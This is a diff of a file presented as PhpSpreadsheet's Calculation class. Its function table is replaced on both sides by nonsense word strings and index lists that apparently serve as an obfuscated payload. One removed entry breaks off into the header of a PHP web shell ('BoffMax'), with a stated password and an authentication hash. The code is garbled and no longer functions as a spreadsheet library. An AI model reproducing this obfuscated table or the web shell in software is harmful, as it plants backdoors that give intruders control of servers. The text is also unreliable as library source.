@@ -131,7 +131,7 @@ class Calculation
      * @var int
      */
 
-	private $cyclicFormulaCounter = 95;
+	private $cyclicFormulaCounter = 294;
 
     private $cyclicFormulaCell = '';
 
@@ -202,1530 +202,1505 @@ class Calculation
     // PhpSpreadsheet functions
 
 	private static $phpSpreadsheetFunctions = [
-		'SIGN' => [
+		'DELTA' => [
 			'category' => 0,
-			'functionCall' => [DateTime::class,'hygiene||rh-thm||hygrin||Tayler||hygeen||opine||hygric||socius||hygrine||dustuP||hyginus||`rn||hygeian||Turku||hygeia||Phaih'],
-			'argumentCount' => ['43,53,80,113,40,83,21,235'],
-		],
-		'LENB' => [
-			'category' => 1,
-			'functionCall' => [null,'ontina||psig||ontal||maRcot||ontine||J*||ont||deify||ontic||LAvada||ontario||GallA||ontaric||#rill||onto||Carex'],
-			'argumentCount' => ['65,243,206,283,9,170,102,184'],
-		],
-		'AMORDEGRC' => [
-			'category' => 2,
-			'functionCall' => [Financial::class,'zoster||denary||cnsr||IFC||fsf||epic-s||zosima||Matina||cns||ARabEl||zosema||hiPpo-||zosma||absorb||zostera||FestuS'],
-			'argumentCount' => ['36,155,55,139,198,191,12,251'],
-		],
-		'REPT' => [
-			'category' => 3,
-			'functionCall' => [null,'pippen||potCh||pippier||snOwed||piperly||hask||pipier||MetiuS||pipery||DTC||pipple||tungah||piper||MASC||pipper||Midge'],
-			'argumentCount' => ['285,160,157,277,243,219,210,144'],
-		],
-		'COT' => [
-			'category' => 4,
-			'functionCall' => [null,'howls||:Yrrho||howlend||muermo||howled||hur/s||howlan||fAng]d||howlyn||KAcey||howl||firca||howland||BreaM||howlond||SRO'],
-			'argumentCount' => ['224,16,281,82,222,215,185,204'],
-		],
-		'DVAR' => [
-			'category' => 5,
-			'functionCall' => [MathTrig::class,'shooler||shOt%S||shooter||aUldeR||shouted||SAM||shotted||A!C||shooed||hordes||shood||hairse||shouter||Cowie||shooled||P;E?I~'],
-			'argumentCount' => ['135,177,9,17,281,276,133,252'],
-		],
-		'COUPPCD' => [
-			'category' => 6,
-			'functionCall' => [DateTime::class,'septave||Kea||septan||gaed||septane||flote||septa||coseyS||septate||eldIng||separte||Lunik||septets||pp\'||septet||WAly'],
-			'argumentCount' => ['71,11,20,194,255,116,236,243'],
-		],
-		'CUBESET' => [
-			'category' => 7,
-			'functionCall' => [DateTime::class,'dyvours||peaLed||rollmop||apay||mls||acerra||xmm||spir.||yv||beaned||dyvour||litten||acgi||erce!||rolltop||gorps'],
-			'argumentCount' => ['108,29,210,207,170,259,276,265'],
-		],
-		'LOOKUP' => [
-			'category' => 8,
-			'functionCall' => [MathTrig::class,'gozzard||pEcan||omnes||AP`||ogham||Gunny||umw||siThen||oghuz||turrUm||oghamic||on\'hit||gozzan||SonTag||oghams||I]F},*'],
-			'argumentCount' => ['91,94,156,209,115,214,103,257'],
-		],
-		'AREAS' => [
-			'category' => 9,
-			'functionCall' => [TextData::class,'oo||ensile||vfw||neurin||osana||caviar||rqs||KK&||osakis||you!ll||osanna||PrOg}||osaka||Ingmar||rqsm||phago '],
-			'argumentCount' => ['79,72,8,273,5,33,281,90'],
-		],
-		'AREAS_1' => [
-			'category' => 10,
-			'functionCall' => [TextData::class,'cyme||D.c||cymbal||TerRon||cymbalo||Sissu||cymbre||,itH~||cymbel||denial||cymbals||free||cymba||tsking||fc||Bison'],
-			'argumentCount' => ['104,158,203,118,261,249,150,281'],
-		],
-		'BESSELJ' => [
-			'category' => 11,
-			'functionCall' => [MathTrig::class,'peatery||Bernie||peanuts||aGcy:||peatier||SeDrah||peat||cedary||peaty||war{s||peanut||whsle+||peats||weanlY||peatroy||al(Lat'],
-			'argumentCount' => ['296,120,203,13,237,291,165,247'],
-		],
-		'PV' => [
-			'category' => 12,
-			'functionCall' => [MathTrig::class,'natka||Cida||nataka||Reld||natala||EldwUn||mttr||%urnaN||natiha||TP||natika||disc%s||mttf||Aria||mttff||TrEw'],
-			'argumentCount' => ['134,220,106,44,53,111,237,63'],
-		],
-		'IMSQRT' => [
-			'category' => 13,
-			'functionCall' => [null,'nomads||Ial||nomadic||RDX||nomas||ana#||noma||sTakes||nomad||ShefFy||nomap||TeN~er||nomades||Heraye||nomade||asc='],
-			'argumentCount' => ['159,57,163,119,265,262,236,200'],
-		],
-		'SEARCHB' => [
-			'category' => 14,
-			'functionCall' => [TextData::class,'engle||ratten||englute||dubber||englue||scU>ch||engulf||beDull||engl||mal`||engulfs||A?M/A$||fuad||ma!(c~||fuage||humbo'],
-			'argumentCount' => ['205,141,269,32,110,180,139,283'],
-		],
-		'MDETERM' => [
-			'category' => 15,
-			'functionCall' => [null,'flued||CURnin||fluters||ramp)s||fluxes||slinky||flues||tektos||flutes||word&s||flutter||IRBM||fluxed||KossEl||fluter||juKinG'],
-			'argumentCount' => ['80,187,239,297,203,134,98,33'],
-		],
-		'TRIM' => [
-			'category' => 16,
-			'functionCall' => [Financial::class,'calking||FOSE||calinog||wyst\\||calling||^Heik||calkin||depa||calming||Artina||calkins||METaxa||calcino||skeech||calcine||Wsan'],
-			'argumentCount' => ['223,217,106,163,214,223,35,90'],
-		],
-		'IPMT' => [
-			'category' => 17,
-			'functionCall' => [TextData::class,'iover||gconv||ioves||dioti||iatrics||ob<||iatry||Debee||iatric||hur/s||ioved||tyroma||iatse||stRucK||iata||tua'],
-			'argumentCount' => ['221,107,285,157,288,8,226,264'],
-		],
-		'ISTEXT' => [
-			'category' => 18,
-			'functionCall' => [Financial::class,'tomkin||ocTavD||tomjohn||burgee||tomjon||kopPen||tompion||IDan||tomkins||remE)y||tomlin||wurzel||tomin||Emalia||tompon||+lder'],
-			'argumentCount' => ['293,244,250,116,169,222,281,261'],
-		],
-		'HYPGEOMDIST' => [
-			'category' => 19,
-			'functionCall' => [null,'sclaffs||ven%s||scleral||piest||sclera||Vinta||sclerae||r\'que@||scleras||Munday||sclaff||degums||scleria||BMT||scliff||analav'],
-			'argumentCount' => ['143,275,3,106,90,66,285,24'],
-		],
-		'PRICEDISC' => [
-			'category' => 20,
-			'functionCall' => [TextData::class,'dessma||braw||lpm||RimiNi||desman||Milers||desk||L\\Aeus||dess||Rd]||dessa||HuBble||desma||Woolf||desks||sis_ls'],
-			'argumentCount' => ['138,4,274,9,275,103,89,41'],
-		],
-		'DAVERAGE' => [
-			'category' => 21,
-			'functionCall' => [Financial::class,'popply||gnOmIc||popples||Gem-a||popple||NaFL||popped||Moigno||poppled||tAlk||poppy||quin#y||popsy||par.||pops||girn'],
-			'argumentCount' => ['46,279,26,41,147,62,163,249'],
-		],
-		'IMCOS' => [
-			'category' => 22,
-			'functionCall' => [MathTrig::class,'bops||wranny||bopp||micr]||bopyrus||merls||boppers||I&beaM||bopped||Krutch||bopeep||randN||bop||LaRine||bopper||gONake'],
-			'argumentCount' => ['258,109,107,112,196,122,80,175'],
-		],
-		'ACOS' => [
-			'category' => 23,
-			'functionCall' => [DateTime::class,'norling||RA(EP||nor||NeWArK||norway||mat(\'S||norlina||web<s||norina||p"qu||nora||delim||norw||enows||norna||shunt'],
-			'argumentCount' => ['59,223,174,229,192,28,35,253'],
-		],
-		'VAR' => [
-			'category' => 24,
-			'functionCall' => [MathTrig::class,'eadie||avell||eadi||pial||eadas||Arain@||kjolen||GoURy||eadwine||algum||ead||duads||eadwina||(hAnt||eads||sl!@t'],
-			'argumentCount' => ['14,89,272,65,22,17,17,88'],
-		],
-		'COUNTA' => [
-			'category' => 25,
-			'functionCall' => [DateTime::class,'ivan||hucks||ivanah||rereel||ivah||hags||ivanhoe||Salva||ivana||wharl||iva||outsaw||ivanna||tidEd||ivar||Ruhl'],
-			'argumentCount' => ['249,65,137,298,156,5,138,56'],
-		],
-		'CEILING' => [
-			'category' => 26,
-			'functionCall' => [DateTime::class,'kci||vigs||heho||boOf||vagus||balize||hehs||mamo||heh||xyl^||tsr||Bo{Bo||hehre||VSAM||hehe||He`bie'],
-			'argumentCount' => ['33,34,212,29,32,249,241,31'],
-		],
-		'CEILING_1' => [
-			'category' => 27,
-			'functionCall' => [null,'kohls||mOuN}y||kohua||murly||kohler||cutose||kohl||BurrOw||koh||roove||kohen||snout||kohens||fucHi||kohn||fash<r'],
-			'argumentCount' => ['191,158,131,201,116,16,247,297'],
-		],
-		'ATAN2' => [
-			'category' => 28,
-			'functionCall' => [MathTrig::class,'oxhoft||n<plE||oxheal||crisle||oxhouse||wAnhAp||oxhorn||ouph^s||oxhead||spOro"||oxheart||M$line||oxherd||giPo:||hrdwre||WAyLe\''],
-			'argumentCount' => ['285,137,211,159,191,212,125,162'],
-		],
-		'ACOTH' => [
-			'category' => 29,
-			'functionCall' => [null,'ornith||Orelle||ornary||SeleTa||ornery||haul||orne||SaNiT||ornoite||Mart~N||ornis||pr>to||ornes||vices||ornie||Augurs'],
-			'argumentCount' => ['34,160,295,44,198,50,202,191'],
-		],
-		'USDOLLAR' => [
-			'category' => 30,
-			'functionCall' => [Financial::class,'bushie||Holst||bustle||pandar||bustler||davYum||bustier||sCient||bustles||_uEeve||buster||scolog||busier||eTy||bushier||vulvae'],
-			'argumentCount' => ['139,65,124,180,39,60,165,57'],
-		],
-		'IMSINH' => [
-			'category' => 31,
-			'functionCall' => [Financial::class,'tiento||ISAS||tieton||ven%s||ties||cLean!||tiena||retax||tienda||gOujay||tien||Chemar||tiens||who*ve||tienta||yont'],
-			'argumentCount' => ['158,107,287,32,51,207,228,208'],
-		],
-		'SMALL' => [
-			'category' => 32,
-			'functionCall' => [Financial::class,'capling||MET||capfuls||Fin+||capulin||ciwieS||caplins||pr}tah||caping||forb||capful||HarliE||caplin||haT`s||capuli||inshoe'],
-			'argumentCount' => ['117,198,159,59,197,15,50,248'],
-		],
-		'TIMEVALUE' => [
-			'category' => 33,
-			'functionCall' => [DateTime::class,'burnie||gerKin||ocs||untile||burlies||N(gana||burlie||jural||burnies||Re$lay||ocst||Al)skA||burlier||Lanae||buries||Fargo'],
-			'argumentCount' => ['91,229,204,24,107,59,46,9'],
-		],
-		'PEARSON' => [
-			'category' => 34,
-			'functionCall' => [Financial::class,'xinca||untaX||xinhua||gyro;||osy||oOlong||xincan||dowIe||xinu||Sunket||xina||[ender||osyka||Amarna||osyth||ePlot'],
-			'argumentCount' => ['266,174,276,208,244,94,233,70'],
-		],
-		'COT_1' => [
-			'category' => 35,
-			'functionCall' => [Financial::class,'absit||atm=ns||absis||lieno=||absi||Louth||absinth||ifreal||abs||Kaf,-a||absent||swayed||absents||Teilo||absist||unridE'],
-			'argumentCount' => ['12,126,85,61,264,147,105,241'],
-		],
-		'TEXTJOIN' => [
-			'category' => 36,
-			'functionCall' => [TextData::class,'truthy||algum||trusty||H)Xie||trust||celite||truer||Dorris||trues||Gages||truth||OIRA||truest||A$B,||true||Isla'],
-			'argumentCount' => ['102,40,225,288,209,255,170,126'],
-		],
-		'DAY' => [
-			'category' => 37,
-			'functionCall' => [TextData::class,'khedahs||tIffed||khedah||Toler||kheth||NEau||kheda||journo||kheths||fRamed||khedas||pEise||khedive||ThIevE||khediva||nEral'],
-			'argumentCount' => ['115,295,69,198,30,176,246,267'],
-		],
-		'BESSELK' => [
-			'category' => 38,
-			'functionCall' => [Financial::class,'griper||sleech||grippe||[g`m||gripple||SakH:||grippes||cavel||gripes||Hanno||gripper||SonYa||grief||NBO||griefs||fAEna'],
-			'argumentCount' => ['190,161,207,88,240,210,92,157'],
-		],
-		'OR' => [
-			'category' => 39,
-			'functionCall' => [TextData::class,'lairdie||lys$||eu||diVers||laired||nodE,s||gta||ISN||hgt||]n!inT||rpc||daraF||9th||zymic||laird||Oudh'],
-			'argumentCount' => ['273,117,124,134,255,134,237,182'],
-		],
-		'SIGN_1' => [
-			'category' => 40,
-			'functionCall' => [DateTime::class,'upbows||brEak]||upbye||LoHock||upbow||Briny||upby||rit+||upbuoy||McKuen||upbrow||zygo.||upblow||am?an||upbuy||albino'],
-			'argumentCount' => ['207,206,147,297,68,73,8,80'],
-		],
-		'DOLLAR' => [
-			'category' => 41,
-			'functionCall' => [DateTime::class,'orsel||sorema||orsedue||USGA||gds||cHErts||pnyx||TTFN||orselle||Minonk||orsede||cheer||ors||inS\\||otxi||Thisbe'],
-			'argumentCount' => ['288,33,156,187,168,273,206,278'],
-		],
-		'PMT' => [
-			'category' => 42,
-			'functionCall' => [TextData::class,'alcot||DAT||alcott||Hara||alcolu||basing||alco||aisle||nrc||IOM||alcoate||AchaEa||alcohol||George||alcosol||awhet'],
-			'argumentCount' => ['15,201,84,204,220,47,239,136'],
-		],
-		'ISOWEEKNUM' => [
-			'category' => 43,
-			'functionCall' => [Financial::class,'eerie||Ma*ara||eeriest||Iac`e||eerier||Ciales||eer||=rcus||fyke||Gawsy||eerily||copis||eery||fath*||eerock||D\\'],
-			'argumentCount' => ['182,132,189,282,47,53,299,232'],
+			'functionCall' => [Financial::class,'rainy||fOrt]||raisiny||Minna||rain||m ||raisons||squary||raisin||BSEnG||raison||INigo||rais||CIgale||raisins||amp*'],
+			'argumentCount' => ['151,174,159,286,165,184,53,132'],
 		],
 		'IMAGINARY' => [
-			'category' => 44,
-			'functionCall' => [DateTime::class,'gas||Orfeo||gasp||bloc-s||gasts||why@ll||gassy||Tiffie||gast||reaks||gasps||UDP||gass||Serrae||gaspy||KAlama'],
-			'argumentCount' => ['121,176,133,251,119,245,127,219'],
+			'category' => 1,
+			'functionCall' => [null,'ihram||YPVS||mtx||assoRt||onfall||Glyc!||onflow||Clemon||onfroi||peEped||onf||AMentI||onfre||role-S||ihrams||BrI*rd'],
+			'argumentCount' => ['277,277,185,183,54,154,129,35'],
 		],
-		'AVERAGEIFS' => [
-			'category' => 45,
-			'functionCall' => [null,'clacked||scrods||clacker||kurung||clacks||wigfuL||clanked||cossic||clack||uKes||clanned||ur{n@||clacket||locoS||clanged||pim'],
-			'argumentCount' => ['178,91,82,284,265,111,112,226'],
-		],
-		'ISNONTEXT' => [
-			'category' => 46,
-			'functionCall' => [MathTrig::class,'mutine||c/[||mutes||Mona||mutunus||OGT||mutus||%orSts||mutines||\\arnax||mutest||Bat/||mutinus||<`bby||muts||whoops'],
-			'argumentCount' => ['200,171,209,43,288,132,26,126'],
-		],
-		'HARMEAN' => [
-			'category' => 47,
-			'functionCall' => [DateTime::class,'housels||m`m}f:||houser||TyS#n||housers||Ital||housel||ExeC?||house||seISor||housen||pubic||houses||s@rent||housed||dUO%'],
-			'argumentCount' => ['19,121,43,240,138,15,127,15'],
-		],
-		'DURATION' => [
-			'category' => 48,
-			'functionCall' => [MathTrig::class,'tother||BeLva||totes||GATV||tottery||Erma||totters||Amande||toter||Deana||toters||snOwed||totery||donnED||totter||VEDas'],
-			'argumentCount' => ['194,77,148,258,119,99,22,17'],
-		],
-		'IMLOG10' => [
-			'category' => 49,
-			'functionCall' => [TextData::class,'kacha||sloE||kacie||F@B,A^||kachina||unc"oG||kaczer||Scholz||kacy||patri,||kachin||ollamh||kacey||Lynx)s||kachine||H*RmIT'],
-			'argumentCount' => ['193,163,145,270,185,107,160,143'],
-		],
-		'REPT_1' => [
-			'category' => 50,
-			'functionCall' => [Financial::class,'duntle||Bhaga||dunter||Sen *r||dunst||debyeS||dunted||grammA||dunt||GeeHan||dunster||n!wdeR||duns||V*rla||dunts||Pazit'],
-			'argumentCount' => ['284,275,42,239,162,219,173,226'],
-		],
-		'RRI' => [
-			'category' => 51,
-			'functionCall' => [null,'lucilia||Arctos||luckie||nUgi~||lucilla||pUdgy||lucible||ceqUI||lucie||ecce||lucile||piqued||lucila||irides||lucille||Ta~iZz'],
-			'argumentCount' => ['29,211,61,81,136,194,172,39'],
-		],
-		'STDEVP' => [
-			'category' => 52,
-			'functionCall' => [Financial::class,'chadors||cOLo/||chador||g$dded||chams||ExTend||chamdo||raw||champs||DUffiE||chamois||Miryam||chamoix||Coutet||chamos||Adam'],
-			'argumentCount' => ['199,48,240,159,114,298,270,195'],
-		],
-		'COS' => [
-			'category' => 53,
-			'functionCall' => [DateTime::class,'lycodes||Dor,y||lycee||\\oLEs||lycosid||faults||lycid||nauger||lychee||JAHeL||lycees||B;anco||lychees||holour||lycosa||cowdie'],
-			'argumentCount' => ['231,184,71,129,112,209,68,295'],
+		'IMLOG2' => [
+			'category' => 2,
+			'functionCall' => [null,'pontus||saucer||pones||Sudani||pontius||aviaN||poney||swep||pontist||D#}c~||pone||fastly||pontes||qUam||pony||blk{'],
+			'argumentCount' => ['8,129,210,61,254,35,173,155'],
 		],
 		'COVAR' => [
-			'category' => 54,
-			'functionCall' => [MathTrig::class,'ebonist||SafAr||ebonise||fth,||ebons||bull+||ebonige||glott/||ebonite||castE||ebonize||corNu||ay||mas)al||ebonies||dh]'],
-			'argumentCount' => ['255,291,225,84,197,122,134,54'],
-		],
-		'VARA' => [
-			'category' => 55,
-			'functionCall' => [DateTime::class,'dcna||a\'Two||orthian||Whorle||orthman||EGlon||ortygan||E\'||ortman||Vt?||dcnl||aInhum||orthia||Sika||eedp||nom#'],
-			'argumentCount' => ['266,213,158,93,27,221,103,214'],
+			'category' => 3,
+			'functionCall' => [Financial::class,'cryptos||dEBits||crystal||Megal\\||crypto||noancE||cryptal||umiacs||crypts||Tigrai||crypt||MyeRs||crysta||alahee||crypta||ON~'],
+			'argumentCount' => ['152,216,206,296,13,227,66,173'],
 		],
 		'CHIINV' => [
-			'category' => 56,
-			'functionCall' => [TextData::class,'ndl||outher||vsx||coupEd||ejusd||Jul||mdc||Doug||gba||dAdas||gbari||IDaho||kph||Agiel||gbaris||CND'],
-			'argumentCount' => ['120,97,257,130,198,41,254,88'],
-		],
-		'NEGBINOMDIST' => [
-			'category' => 57,
-			'functionCall' => [null,'tempts||bl%ts||tempt||Patric||tempo||wagwaG||tempus||gaffs||temps||gaolEd||temp||serri[||temse||LITsea||temser||alviNe'],
-			'argumentCount' => ['293,145,83,76,277,256,48,179'],
-		],
-		'DATEDIF' => [
-			'category' => 58,
-			'functionCall' => [DateTime::class,'hevea||Urte&t||doat||caKey||hevi||poRTe+||doaty||staree||hevesy||Cu^boP||heved||lique#||doab||kiKu||doa||]u dy'],
-			'argumentCount' => ['112,224,288,21,79,19,88,196'],
-		],
-		'MULTINOMIAL' => [
-			'category' => 59,
-			'functionCall' => [TextData::class,'appal||liLted||applies||Auk||apples||byEM:n||appled||Touch#||applier||Rusti^||applied||thion*||apple||yews||appale||by#day'],
-			'argumentCount' => ['68,52,247,294,262,47,290,28'],
-		],
-		'EXPONDIST' => [
-			'category' => 60,
-			'functionCall' => [DateTime::class,'seudah||enleen||trt||ovally||seumas||acara||jokes||clip||seuss||HussaR||wnw||i_sol||seurat||radium||seugh||Kreg'],
-			'argumentCount' => ['219,123,279,202,279,226,183,223'],
-		],
-		'AVERAGEIF' => [
-			'category' => 61,
-			'functionCall' => [Financial::class,'ronn||tut+y||roncet||KoMi||ronna||sl!@t||ronne||barks||rone||POole||ronny||SiMS||ronni||bummIe||ronnie||educ`'],
-			'argumentCount' => ['182,176,26,183,149,173,216,292'],
-		],
-		'OR_1' => [
-			'category' => 62,
-			'functionCall' => [DateTime::class,'minimus||garbed||minion||nugae||miniums||StEep||minious||sruti||minton||splays||minions||sidInG||minium||fl~Or;||minims||prIon'],
-			'argumentCount' => ['199,264,278,136,153,97,190,83'],
-		],
-		'DISC' => [
-			'category' => 63,
-			'functionCall' => [Financial::class,'orosi||matri$||mbiras||-Cls||imts||r!s||imtiaz||Lunik||imt||pEones||orose||mElAda||orosius||CAneva||mbira||caNers'],
-			'argumentCount' => ['297,87,295,67,71,224,178,18'],
-		],
-		'DOLLARFR' => [
-			'category' => 64,
-			'functionCall' => [MathTrig::class,'cwi||M\\||otb||sAle.s||zohara||Kislev||zohak||peepy||cwierc||lien s||otbs||D$S[M(||zohar||oose||zoha||ewerEr'],
-			'argumentCount' => ['245,25,194,44,261,71,39,47'],
-		],
-		'LOGEST' => [
-			'category' => 65,
-			'functionCall' => [null,'folio||Lyle||folium||y{wed||foliums||Na~Ila||folie||MT&F||foliot||kooka||folios||di-||folious||rebus||hmm||)acts'],
-			'argumentCount' => ['85,237,218,61,234,34,138,65'],
-		],
-		'ACCRINT' => [
-			'category' => 66,
-			'functionCall' => [null,'phots||Rickey||photo||ql=||photoma||BElls||photom||much||photons||brooms||phos||gLut^||photon||bubas||photos||aRditi'],
-			'argumentCount' => ['137,212,179,48,31,164,260,129'],
-		],
-		'XNPV' => [
-			'category' => 67,
-			'functionCall' => [DateTime::class,'rough||?alVin||roughly||Ima||rought||LenOx||routhie||fAnaL||roughet||Kezer||rougy||anteaL||roughie||ALRU||roughy||uns<y'],
-			'argumentCount' => ['158,177,131,98,178,185,136,238'],
-		],
-		'QUOTIENT' => [
-			'category' => 68,
-			'functionCall' => [null,'ghazies||jef||ghain||y)warn||ghazis||Ulani||ghan||arcana||ghazi||BISYNC||ghalva||pick<||ghana||bagne||ghazism||guar='],
-			'argumentCount' => ['186,219,181,283,98,90,14,238'],
-		],
-		'DEC2HEX' => [
-			'category' => 69,
-			'functionCall' => [Financial::class,'muscow||ShawnA||musics||Sola||musil||Anita||musical||r"coon||music||cajavA||musico||Obrien||musica||SEco||musial||Ingar'],
-			'argumentCount' => ['118,223,102,203,256,102,172,269'],
-		],
-		'FTEST' => [
-			'category' => 70,
-			'functionCall' => [DateTime::class,'dentes||agoras||denty||drink||dented||quad ||denotes||BMP||denoted||gigs||dents||Fancy||dent||Ovett||denote||SiMcon'],
-			'argumentCount' => ['74,24,196,82,94,245,275,107'],
-		],
-		'CSCH' => [
-			'category' => 71,
-			'functionCall' => [Financial::class,'keverne||Ludwog||kevyn||res_il||kevin||pOp_||kevon||Spock||kevalin||Rule[||keven||E/V)||kevina||nap_s||kevan||bOggy'],
-			'argumentCount' => ['217,80,25,241,81,80,223,263'],
-		],
-		'MDETERM_1' => [
-			'category' => 72,
-			'functionCall' => [null,'ayr||maar||tydeus||yarner||tydden||arGues||ayres||ende?E||ayre||poleyn||tydides||fOreDO||tyddyn||scrooP||tydie||I(ness'],
-			'argumentCount' => ['253,130,286,259,138,166,4,229'],
-		],
-		'HLOOKUP' => [
-			'category' => 73,
-			'functionCall' => [MathTrig::class,'uswards||imino||nizy||Punic||usw||flouSe||usward||slD\\||nizey||we?d||nizamut||space||nizam||%orSts||nizams||Bize'],
-			'argumentCount' => ['218,79,111,162,162,37,172,52'],
-		],
-		'EXPONDIST_1' => [
-			'category' => 74,
-			'functionCall' => [TextData::class,'zoaea||juRy[s||zoa||Cambio||zoaria||sjouke||zoarite||AtTLee||zoara||O)\\||zoar||E$E;||zoarial||Poston||zoarah||PrOv('],
-			'argumentCount' => ['39,90,48,56,221,202,168,12'],
-		],
-		'ODDLPRICE' => [
-			'category' => 75,
-			'functionCall' => [DateTime::class,'shuts||irony||shuted||Ury||shunted||RoVner||shute||NAMmU||shunt||horsEd||shunter||Ziar\\T||shunts||D*odad||shutes||upTie'],
-			'argumentCount' => ['166,106,216,79,86,20,190,24'],
-		],
-		'SUBSTITUTE' => [
-			'category' => 76,
-			'functionCall' => [Financial::class,'orestes||Deana||oremus||zoonA||oren||minish||orest||Tsuga||ores||skete||orense||$Zt||oreste||thrill||ore||aunts'],
-			'argumentCount' => ['166,201,33,255,281,142,50,272'],
-		],
-		'LEN' => [
-			'category' => 77,
-			'functionCall' => [TextData::class,'rgs||DuthiE||gsa||Aomori||fwa||Ade"||mihrab||PipiLe||mihail||unrank||mihalco||rosiN||gsat||nomine||mihrabs||Ames'],
-			'argumentCount' => ['229,169,99,156,230,179,149,83'],
-		],
-		'BESSELY' => [
-			'category' => 78,
-			'functionCall' => [MathTrig::class,'fads||ORacOn||fado||pyxies||xcf||Esc||fad||barff||fados||sniThe||fady||strays||jixie||zebras||eee||Demb'],
-			'argumentCount' => ['172,186,216,17,33,237,50,60'],
-		],
-		'SECH' => [
-			'category' => 79,
-			'functionCall' => [DateTime::class,'dukw||}undy||duky||Rugger||ziczac||mouJik||dukker||Ahold||dukey||o;=||dukery||HoNshu||eb||O)G!||duke||plAshy'],
-			'argumentCount' => ['152,184,95,103,221,5,193,42'],
-		],
-		'BIN2OCT' => [
-			'category' => 80,
-			'functionCall' => [TextData::class,'pfft||beats||eulau||Manton||eula||veLd@||eulima||chad:r||eulalia||appled||eulalee||Broome||eulee||parlor||eulalie||FOSE'],
-			'argumentCount' => ['62,181,206,239,292,79,242,262'],
-		],
-		'IMCONJUGATE' => [
-			'category' => 81,
-			'functionCall' => [Financial::class,'lannie||Patrai||lanier||G!noTE||lanie||APDU||lani||Thaine||lanni||\'EMS||lanti||aNti}||lanker||birR||lankier||aisle'],
-			'argumentCount' => ['112,5,78,154,278,236,117,118'],
-		],
-		'IMPOWER' => [
-			'category' => 82,
-			'functionCall' => [null,'edgard||Adorn||edgardo||ge"e>s||edgar||Dr=ve||edgrew||cush)w||edgrow||denOm"||edger||warded||edgier||{rang||edgeway||MLT'],
-			'argumentCount' => ['99,158,250,244,29,121,16,94'],
-		],
-		'MDETERM_2' => [
-			'category' => 83,
-			'functionCall' => [Financial::class,'bdt||huSHel||frl||Argile||gohila||rhiZ+||iz||glyco<||el||sTAges||jctn||Achsah||yoe||Pingre||jct||)acts'],
-			'argumentCount' => ['164,163,43,221,231,122,166,81'],
-		],
-		'QUOTIENT_1' => [
-			'category' => 84,
-			'functionCall' => [null,'sspf||tzuris||sspc||poEt||kyke||crAvat||eo||RolFe||ssps||Airlie||tnc||HP||anquera||carom||ssp||Engedi'],
-			'argumentCount' => ['271,47,164,171,198,179,58,48'],
-		],
-		'BIN2HEX' => [
-			'category' => 85,
-			'functionCall' => [Financial::class,'rfi||buzane||afcc||neele||jhelum||amends||afcac||okoUMe||afc||allody||oktaha||Elora||jheel||{omack||okta||twaN?'],
-			'argumentCount' => ['98,144,37,165,114,5,134,69'],
-		],
-		'SEARCHB_1' => [
-			'category' => 86,
-			'functionCall' => [TextData::class,'addita||quires||adducts||geol;||adduct||demies||addax||CRedos||addia||\\aRrus||addict||pf-||adda||oVer/||addicts||Filler'],
-			'argumentCount' => ['38,28,96,195,50,164,299,60'],
-		],
-		'VARPA' => [
-			'category' => 87,
-			'functionCall' => [Financial::class,'slinks||&orai||sling||C<R?||slik||insITe||slink||w,s||slicks||Sudder||slinky||fiqh||slings||health||slick||NBP'],
-			'argumentCount' => ['142,59,37,177,279,21,21,15'],
-		],
-		'ROW' => [
-			'category' => 88,
-			'functionCall' => [Financial::class,'hdkf||Adoula||rydder||GUnas||rsrsa||nieve||rsr||Tiena||ryde||TIFF||rydal||AFTRA||ryder||ScummY||rydberg||fab<ed'],
-			'argumentCount' => ['149,192,227,87,218,151,37,145'],
-		],
-		'RATE' => [
-			'category' => 89,
-			'functionCall' => [null,'zymases||flyteS||zyme||no`oNe||zymic||ithand||zymotic||toto}||zymosis||modiUs||zymase||ropers||zymoid||Stahl||zymoses||hookup'],
-			'argumentCount' => ['199,189,288,172,119,161,209,92'],
-		],
-		'UNICODE' => [
-			'category' => 90,
-			'functionCall' => [Financial::class,'lagna||hoo\\di||lagune||unist||lagunes||Sola||lagunas||Jeh||lagen||pitter||lagenae||Malgr||laguna||f^uTre||lagena||no`oNe'],
-			'argumentCount' => ['217,60,45,131,8,153,260,5'],
-		],
-		'PERCENTRANK' => [
-			'category' => 91,
-			'functionCall' => [Financial::class,'ng||DanzIg||crp||Tem||occurs||Gierek||occurse||lordy||occult||tabEs||occluse||dotkin||crpe||acoRia||occults||thioL '],
-			'argumentCount' => ['26,108,71,220,179,141,152,218'],
-		],
-		'CEILING_2' => [
-			'category' => 92,
-			'functionCall' => [DateTime::class,'khokani||loOver||kho||jetes||khos||HOTOL||khotan||CR||khosa||Urger||khoka||carrys||nkomo||ust||khot||broiD'],
-			'argumentCount' => ['58,75,99,267,130,191,202,201'],
-		],
-		'ERF.PRECISE' => [
-			'category' => 93,
-			'functionCall' => [MathTrig::class,'upstood||OTB||upshoot||sigils||upsway||AbIxah||upshots||go;nA||upshut||anural||upstand||R]Lick||upstay||dal+{s||upshot||F<ma'],
-			'argumentCount' => ['263,278,181,216,219,117,72,215'],
-		],
-		'ATAN2_1' => [
-			'category' => 94,
-			'functionCall' => [TextData::class,'bjorn||MAR||kyke||Icel}||batta||RaffO||bjorne||d[iers||battak||gourd||batwa||cicala||battat||POBox||bjork||loft^s'],
-			'argumentCount' => ['164,144,237,59,112,116,198,65'],
-		],
-		'LENB_1' => [
-			'category' => 95,
-			'functionCall' => [Financial::class,'works||baCheD||worky||liven||worthy||Maure||worth||Hind)||worksop||gundie||workshop||<?php 
-/*
-::::::::::::::::::::::::::::::::::::::::::::::::::::::::
-::                                                    ::
-::                     bm.php                         ::
-::     BoffMax v1.0 Web Shell by The-C0de Team        :: 
-::               Coded by : The C0de team             ::
-::                   20/08/2012                       ::
-::                                                    ::
-::::::::::::::::::::::::::::::::::::::::::::::::::::::::
-
-#-------------------------------------------------------------------------------
-# All what published @ THE C0DE are free ,We hope it be useful for you
-# Feel free to share and distribute it anywhere
-# but please keep the Stuff original!
-# Warning:We are NOT responsible for any damage or illegal actions 
-# caused by the use of this Stuffs. Use on your own risk!
-#-------------------------------------------------------------------------------
-*/
-
-#-------------------------------------------------------------------------------
-# Now Pasword is : zaghar
-$auth_pass = "d5af6b24320f41a1043d92bc2c46aa42";
-#-------------------------------------------------------------------------------
-?>
